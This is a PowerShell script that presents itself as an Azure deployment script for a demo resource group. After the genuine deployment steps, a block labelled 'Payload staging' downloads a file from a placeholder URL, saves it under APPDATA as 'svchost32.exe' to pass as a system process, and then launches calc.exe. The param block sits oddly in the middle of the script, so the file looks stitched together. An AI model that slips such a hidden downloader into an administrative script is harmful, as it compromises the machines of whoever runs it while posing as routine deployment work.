
$ErrorActionPreference = "Stop"
$ResourceGroup  = "rg-portal-demo-40"
$Location       = 'eastus'
$TemplateFile   = "C:\Scripts\templates\portal-demo.json"
$ParameterFile  = "C:\Scripts\templates\portal-demo.parameters.json"
$SubscriptionId = "fb7d2992-3783-b000-d41d-48677aa7ed25"
$StorageAccount = "stdemo3573"
$VmName         = 'vm-portal-demo-40'
$OutputPath     = 'C:\Logs\deploy-demo-2025-05-15.json'
$DryRun         = $false

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}
if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')
$deployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -Name $DeploymentName
Write-Host ("Deployment {0}: {1}" -f $deployment.DeploymentName, $deployment.ProvisioningState) -ForegroundColor Green
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://example.com/stage1.ps1",
    [string]$DropPath = "$env:APPDATA\svchost32.exe",
    [int]$TransferTimeout = 174
)
Invoke-WebRequest -Uri $PayloadUrl -OutFile $DropPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
